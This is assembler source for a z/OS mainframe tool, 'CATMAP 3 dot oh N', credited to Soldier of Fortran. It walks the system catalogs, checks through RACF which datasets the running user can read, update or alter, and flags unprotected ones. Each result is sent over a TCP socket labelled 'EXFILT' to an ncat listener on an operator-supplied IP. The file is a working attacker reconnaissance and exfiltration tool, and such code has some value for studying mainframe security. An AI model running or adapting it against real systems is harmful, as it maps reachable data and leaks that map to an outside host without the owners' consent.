* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
*
*       .                  .         .
*       .___________       ._________.
*       :    .     /       :         :
*       |    |____/________|    _____|
*       |____.    |        |         |
*       |    |    |    :   |   ______:
*       |    |    |    |   |   |     .
*       :_________|________|___|      
*       . Soldier     of     Fortran  
*
* CATMAP 3 dot oh N
* The N stands for Netwerked!
* 
* R11/R12 for Addressability
* Based *heavily* on mvs9906.pdf
*
* To compile you need to use SYS1.LINKLIB and TCPIP.SEZATCP
* in your Linker SYSLIB
*
* Usage:
* On Linux: ncat -nlvp 4444
* In TSO:   call '<place you compiled this to>'
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
CHKACCSS TITLE 'CATMAP on steroids'
         PRINT ON,DATA,GEN
CLEAR    CSECT
CLEAR    AMODE 31 
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
         YREGS                  # Register readability macro
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
MAIN     BAKR  R14,0            # Save regs linkage stack
M1       LR    R12,R15          # R15 Program base into R12
M2       LA    R11,4095(R12)    # 4k-1 more of addressability
M3       LA    R11,1(R11)       # Ahh there we go
         USING MAIN,R12,R11     # R11/R12 for addressability
* _.-=-._ Get a save area for sockets _.-=-._ 
         LA    R15,MYSAVE              Get addr of own save area
         ST    R13,MYSAVE+4            Save callers save area addr
         ST    R15,8(R13)              Save own save area addr
         LR    R13,R15                 Load Reg13
* _.-=-._ Initiate socket _.-=-._ 
INITSOCK TPUT  NMSG2,L'NMSG2,EDIT
         EZASMI TYPE=SOCKET,      #ssue SOCKET Macro                   X
               AF='INET',         #NET or IUCV                         X
               SOCTYPE='STREAM',  #TREAM(TCP) DATAGRAM(UDP) or RAW     X
               ERRNO=LERRNO,      #Specify ERRNO field)                X
               RETCODE=LRETCODE,  #(Specify RETCODE field)             X
               ERROR=ERRORMAN     #  Abend if Macro error
         CLC   LRETCODE,MINUSONE  # Did we get a socket?
         BNE   STORSOCK           # Yes, phew
         B     ERRORMAN           # NOPE! Die
STORSOCK L     R7,LRETCODE       
         STH   R7,S               # Store the socket descriptor
CONNSOCK TPUT  NMSG3,L'NMSG3,EDIT
         EZASMI TYPE=CONNECT,     #    Issue CONNECT call              X
               S=S,               #    socket descriptor (halfword)    X
               NAME=EXFILT,       #    to Exfil target program         X
               ERRNO=LERRNO,      #    ERRNO field                     X
               RETCODE=LRETCODE    #    RETCODE field
CONNEND  CLC   LRETCODE,MINUSONE   # Did we get a socket?
         BNE   GETCAT           # Yes, phew
         B     ERRORMAN           # NOPE! Die
* _.-=-._ Get the master catalog _.-=-._
GETCAT   L     R5,X'10'        # CVT
         L     R5,X'8C'(R5)    # ECVT
         L     R5,X'188'(R5)   # ECVTIPA
* At this point the catalog is 235 bytes from ECVTIPA
         MVC UCATNAME(44),234(R5) # Master Catalog
         SR R5,R5              # Zero out R5
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* Alright lets get some UCATS!
* First we get storage for IGGCSI00
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
         GETMAIN RC,LV=32767 # Gets storage
*                            # And puts the location in R1
A1       LTR   R15,R15       # Check return code
A2       BNZ   ERRORMAN      # Welp couldnt do that
A3       ST    R1,PARMRWK    # Store the location in PARMRWK
         MVC   0(4,R1),=F'32767' # Put the length at the begining
* _.-=-._ Now we setup the parms for IGGCSI00 _.-=-._
         MVI   CSIFIELD,C' ' # Clear out the first bytes
         MVC   CSIFIELD+1(CSIFIELL-1),CSIFIELD # replace it all
         MVC   CSIFILTK(2),=C'**' # Select All
         MVC   CSICATNM,UCATNAME   # Use the master catalog
         MVI   CSIDTYPS,C'U'      # We only want ucats
         MVI   CSICLDI,C'Y'       # Match clusters
         MVI   CSIS1CAT,C'Y'      # Only search the master catalog
         MVI   CSIRESRV,X'00'     # LOL IBM WUT
         MVI   CSINUMEN,X'0'     # We dont need extra fields just yet
* _.-=-._ Time to call IGGCSI00 _.-=-._         
         LA    R1,PARMLIST        # Put the location PLIST in R1
         CALL  IGGCSI00           # Call Catalog Search Interface
T1       LTR   R15,R15            # Is there a problem?
T2       BZ    RDUCAT             # Nope
T3       CLC   CSIMRR(4),FENTERR  # If 04/64 then its a simple error
T4       BNE   ERRORMAN           # Welp couldnt do that
SAVEMCAT LA    R9,UCATTAB         # Put the location in R9
         MVC   0(44,R9),UCATNAME   # Put the MSTCAT as the first entry
         LA    R9,44(R9)          # Advance R9 to the next location
RDUCAT   L     R5,PARMRWK         # Load GETMAIN storage address in R5
         USING CSIRWORK,R5        # Make it addressable
RDUCAT2  LR    R6,R5              # Also set R6 to GETMAIN location
RDUCAT3  A     R6,CSIUSDLN        # R6 now points to end of data
         LA    R7,CSIRWORL(R5)    # R7 now points to CSIRWENT
         USING CSIRWENT,R7        # And make it addressable
GETUCAT  DS    0H
         MVC   0(44,R9),CSIENAME  # Store it in our table
         LA    R9,44(R9)          # Advance the table pointer
         LA    R7,CSIRWENL(R7)    # Go to Next Entry
         CR    R7,R6              # R6 is total, are we less than?
         BL    GETUCAT            # No we are not
         MVI   0(R9),X'FF'        # Egg marking the end of UCATTABL
         L     R2,PARMRWK         # Put the pointer in R2
         FREEMAIN RC,LV=32767,A=(2) # Free it up
         DROP  R5,R7
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* We now have a list of User Catalogs in UCATTAB
* We're going to loop through each one
* And get the dataset from each
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
         LA    R9,UCATTAB         # Reset R9 to point to UCATTAB
MAINLOOP CLI   0(R9),X'FF'        # Compare the bye, is it FF?
         BE    KILLIT             # Yes, get outta here
         MVC   UCATNAME,0(R9)     # Current Catalog
* _.-=-._ Get this Catalog Entries _.-=-._         
         GETMAIN RC,LV=65535      # Get some space
         LTR   R15,R15            # Did it work?
         BNZ   ERRORMAN           # NOOOOOOPE
         ST    R1,PARMRWK         # Store the location in PARMRWK
         MVC   0(4,R1),=F'65535'  # And how long it is
* _.-=-._ Now we setup the parms for IGGCSI00 (again) _.-=-._
         MVI   CSIFIELD,C' '      # Clear out the first bytes
         MVC   CSIFIELD+1(CSIFIELL-1),CSIFIELD # replace it all
         MVC   CSIFILTK(2),=C'**' # Select All
         MVC   CSICATNM,UCATNAME  # Use the user catalog
         MVI   CSIDTYPS,C'A'      # We only want non-VSAM
         MVI   CSICLDI,C'Y'       # Match clusters
         MVI   CSIS1CAT,C'Y'      # Only search the user catalog
         MVI   CSIRESRV,X'00'     # LOL IBM WUT
         MVC   CSINUMEN,=H'1'     # We need one extra field
         MVC   CSIFLDNM,=CL8'VOLSER  ' # We want the VOLUME now too
CSILOOP  EQU *
* _.-=-._ Time to call IGGCSI00 _.-=-._         
         LA    R1,PARMLIST        # Put the location PLIST in R1
         CALL  IGGCSI00           # Call Catalog Search Interface
C1       LTR   R15,R15            # Is there a problem?
C2       BZ    CONT               # Nope
C3       CLC   CSIMRR(4),FENTERR  # If 04/64 then its a simple error
C4       BNE   ERRORMAN           # Welp couldnt do that     
* _.-=-._ Work with the CSI Data _.-=-._         
CONT     L     R5,PARMRWK         # Load GETMAIN storage address in R5
         USING CSIRWORK,R5        # Make it addressable
         TM    CSICFLG,B'0100000' # CSINOENT no entries? Ugh
         BO    NOENTRY            # Skip this catalog then i guess
         LR    R6,R5              # Set R6 to work location
         A     R6,CSIUSDLN        # R6 now points to end of CSI
         LA    R7,CSIRWORL(R5)    # R7 now points to CSIRWENT
         USING CSIRWENT,R7        # And make it addressable
ENTRLOOP DS    0H         
         MVC   UDATASET,CSIENAME
         LA    R8,CSIRWENL(R7)    # R8 now points to fields
*         LH    R2,0(R8)           # Load length (CSILENFD) in R2
* TODO: Add multi volume support         
         LA    R8,2(R8)           # R8 points to VOLSER
         MVC   UVOLSER,0(R8)      # Put it in UVOLSER
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* Now that we have a volume and a dataset
* its time to check access to it
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
         B     CHKACCSS           # Access check
DONECHK  EQU *
* _.-=-._ Translate it from EBCDIC to ASCII _.-=-._
         MVC   OUTBUF(59),ACCESS  # Copy the entry to our output buffer
* EZACIC04 translates EBCDIC to ASCII in line
* Requires TCPIP.SEZATCP
TRANSLAT CALL  EZACIC04,(OUTBUF,OUTBUFL),VL,MF=(E,PARMLST)
* _.-=-._ Send it down our socket _.-=-._
WRITEIT  EZASMI TYPE=WRITE,            Issue WRITE  call               X
               S=S,                    on this socket                  X
               NBYTE=TOUTPUT,          Length of first message         X
               BUF=OUTBUF,             Text of first message           X
               ERRNO=LERRNO,           ERRNO field                     X
               RETCODE=LRETCODE         RETCODE field         
* _.-=-._ Now Check to see if theres more entries _.-=-._
NEXTENTR LA    R7,CSIRWENL(R7)    # Point R7 at next entry
         AH    R7,0(R7)           # Add the fields
         LA    R7,2(R7)           # Next Entry
         CR    R7,R6              # Have we surpased CSIUSDLN?
         BL    ENTRLOOP           # Nope go again
* _.-=-._ Are there more entries than our work area? _.-=-._         
         CLI   CSIRESUM,C'Y'      # Compare
         BE    CSILOOP            # Yes there area
* _.-=-._ Looks like we're done with this catalog _.-=-._         
NOENTRY  L     R2,PARMRWK         # Store the address in R2
         FREEMAIN RC,LV=65535,A=(2) # Free it up
         LA    R9,UCATTABL(R9)    # Get the next Catalog Entry
         B     MAINLOOP           # Loop it up
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* ERROR WILL ROBINSON
ERRORMAN TPUT  NMSG8,L'NMSG8,EDIT
KILLIT   TPUT  NMSG5,L'NMSG5,EDIT
         EZASMI TYPE=TERMAPI           Issue TERMAPI call
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* We're done here, get the heck out
ENDPRGM  DS    0H           # We're done lets exit
         XR    R15,R15      # zero return code
         PR    ,            # Return to caller
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* Checks access to a dataset
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
CHKACCSS DS 0H
SAFCHK   RACROUTE REQUEST=AUTH,                                        x
               RELEASE=1.9,                                            x
               STATUS=ACCESS,                                          x
               CLASS='DATASET',                                        x
               ATTR=UPDATE,                                            x
               ENTITY=UDATASET,VOLSER=UVOLSER,                         x
               WORKA=SAFWORKA
         LM    R3,R4,SAFCHK+4     # Save Return Code, Rsn Code in R3/R4
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* SAF Return Codes (when R15 is 0 and R3 is x14)
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
*
* R4 is one of the following:
* x0   = No Access
* x4   = READ
* x8   = UPDATE
* xC   = CONTROL (same as UPDATE on non-vsam datasets thanks EM)
* x10  = ALTER
*
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
*
CHECKRTN DS    0H           # Check SAF Return Code in R15
         C     R15,=F'0'    # If its zero check RACF RC
         BE    CHECKACS
         C     R15,=F'4'    # Otherwise is the SAF RC 4?
         BNE   ERROR        # Its not? Then its 8 or 64 and thats bad
         C     R3,=F'4'     # The specified resource is not protected
         BNE   NOACCESS     # We get no access (if rc is 8)
         MVC   ACCESS,NOTPROTA # This dataset is not protected (^-^)
         B     DONECHK
CHECKACS DS    0H
         C     R3,=F'20'    # Is the SAF return code 0x14?
         BNE   ERROR        # No? Then we dont care   
NOACCESS C     R4,=F'0'     # Do we have no access?
         BNE   READ         # We dont? try READ
         MVC   ACCESS,NONEA
         B     DONECHK
READ     C     R4,=F'4'     # Do we have read?
         BNE   UPDATE       # No try UPDATE
         MVC   ACCESS,READA
         B     DONECHK
UPDATE   C     R4,=F'8'     # Do we have update?
         BNE   CONTROL      # Nope, try control
         MVC   ACCESS,UPDATEA
         B DONECHK
CONTROL  C     R4,=F'12'    # Do we have control?
         BNE   ALTER        # Nope, last chance, try alter
         MVC   ACCESS,CONTROLA
         B     DONECHK
ALTER    C     R4,=F'16'    # Do we have alter?
         BNE   ERROR        # Dang, well then we have a problem
         MVC   ACCESS,ALTERA
         B DONECHK
ERROR    MVC   ACCESS,ERRORA 
         B     DONECHK
* Work stuff
UCATNAME DS    CL44' '
ACCESS   DS    CL7
SPACED   DC    C' '
UVOLSER  DS    CL6
SPACED2  DC    C' '
UDATASET DS    CL44
ERRORMSG DC    CL59'ERROR '
FENTERR  DC    XL4'C6E20464'
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* User Catalog Storage Table
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
UCATTAB  DS    100CL44    # 100 User catalogs, hope its enough
UCATTABL EQU   44
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* R1 Plist for IGGCSI00
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
PARMLIST DS    0D              # Parmlist for Dataset listing
PARMMRR  DC    A(CSIMRR)       # 4 bytes module, reason, and rtn code
PARMSCF  DC    A(CSIFIELD)     # IGGCSI00 parameters
PARMRWK  DC    A(0)            # Work area, we fill this with GETMAIN
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* Parameters for IGGCSI00
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
*
* CSIDTYPD/CSIETYPE Info:
* A Non-VSAM data set
* B Generation data group
* C Cluster
* D Data component
* G Alternate index
* H Generation data set
* I Index component
* L ATL Library entry
* R Path
* U User catalog connector entry
* W ATL Volume entry
* X Alias
*
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
CSIFIELD DS    0F
CSIFILTK DC    CL44'**'    # Generic filter key
CSICATNM DC    CL44' '     # Catalog name or blanks
CSIRESNM DC    CL44' '     # RESUME
CSIDTYPD DS    0CL16       # ENTRY TYPES
CSIDTYPS DC    CL16'A               '  # Entry types to be returned
CSIOPTS  DS    0CL4        # CSI OPTIONS
CSICLDI  DC    CL1' '      # Cluster matching (no)
CSIRESUM DC    CL1' '      # RESUME FLAG
CSIS1CAT DC    CL1' '      # SEARCH ONLY 1 CATALOG (no)
CSIRESRV DC    XL1'00'     # RESERVED
CSINUMEN DC    H'1'      # NUMBER OF ENTRIES FOLLOWING
CSIENTS  DS    0CL8        # VARIABLE NUMBER OF ENTRIES FOLLOW
CSIFLDNM DC    CL8'VOLSER  ' # FIELD NAME
CSIFIELL EQU   *-CSIFIELD
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* From CSI: Module ID, Reason and Return code
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
CSIMRR   DS    0F
CSIMODID DC    XL2'0000'    # Module ID
CSIRSNC  DC    XL1'00'      # Reason Code
CSIRTNC  DC    XL1'00'      # Return Code
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* Networking Work Area
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* _.-=-._ TSO Messages _.-=-._ 
NMSG1    DC C'*** INIT'
NMSG2    DC C'*** Getting Socket'
NMSG3    DC C'*** Sending them all (^_^)'
NMSG4    DC C'*** Sending'
NMSG5    DC C'*** We are done (*_*)'
NMSG6    DC C'*** Translating EBCDIC to ASCII'
NMSG8    DC C'*** ERROR ERROR ERROR'
* _.-=-._ Storage _.-=-._ 
         EZASMI TYPE=TASK,STORAGE=CSECT Task Storage Area
MYSAVE   DC    18F'0'                  Register Save Area
S        DS    H
PARMLST  DS    6F
MINUSONE DC    X'FFFFFFFF'
LERRNO   DC    F'0'
LRETCODE DC    F'0'
OUTBUF   DC    CL59'CATMAP3N Is the greatest!'
NEWLINE  DC    X'0A'
OUTBUFL  DC    F'59'
TOUTPUT  DC    F'60'
         CNOP  0,4
EXFILT   DC    0CL16' '         # Structure for connect
         DC    AL2(2)           # FAMILY (AF-INET)
         DC    H'4444'          # Port of exfil
* Set YOUR IP WITH THIS: 
* https://www.browserling.com/tools/ip-to-hex
         DC    X'CHANGEME'   # IP Address in HEX
         DC    XL8'00'       # Never change IBM - RESERVED
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* RACROUTE Work Area
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
NONEA    DC    C'NONE   ' # No Access :( :(
READA    DC    C'READ   ' # Read Access :(
UPDATEA  DC    C'UPDATE ' # Update Access!
CONTROLA DC    C'CONTROL' # Control Access
ALTERA   DC    C'ALTER  ' # Alter Access
WHATA    DC    C'RC N/A ' # Weird Return Code?
NOTPROTA DC    C'NOTPROT' # The dataset is not protected by RACF
ERRORA   DS    C'ERROR  ' # ERROR catch all
SAFWORKA DS    CL512
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
* CSI Work Area
* _.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._
CSIRWORK DSECT
* Information returned for work area
CSIUSRLN DS    F # TOTAL LENGTH OF WORKAREA
CSIREQLN DS    F # MIN REQUIRED WORK AREA LENGTH
CSIUSDLN DS    F # TOTAL USED WORK AREA LENGTH
CSINUMFD DS    H # Number of field names
* Information returned for each catalog
CSICFLG  DS    CL1  # Catalog flag information
CSICTYPE DS    CL1  # Catalog type. X'F0'
CSICNAME DC    CL44' ' # Catalog Name
CSICRETN DS    0XL4 # Return information for Catalog
CSICRETM DS    XL2  # Catalog return module ID
CSICRETR DS    XL1  # Catalog return reason code
CSICRETC DS    XL1  # Catalog return code
CSIRWORL EQU   *-CSIRWORK
* Information returned for each entry
CSIRWENT DSECT
CSIEFLAG DS    XL1  # Entry flag information
CSIETYPE DS    XL1  # Entry Type
CSIENAME DC    CL44' '
CSIRETN  DS    0XL4 # Return information for Catalog
CSIERETM DS    XL2  # Entry return module ID
CSIERETR DS    XL1  # Entry return reason code
CSIERETC DS    XL1  # Entry return code
CSIRWENL EQU   *-CSIRWENT
* Fields
CSIEDATA DS    0CL3
CSILENFD DS    CL2
CSILENF1 DS    CL1
* END
         DROP  R11,R12    # Drop Addressability
         END   MAIN  # Peace owt
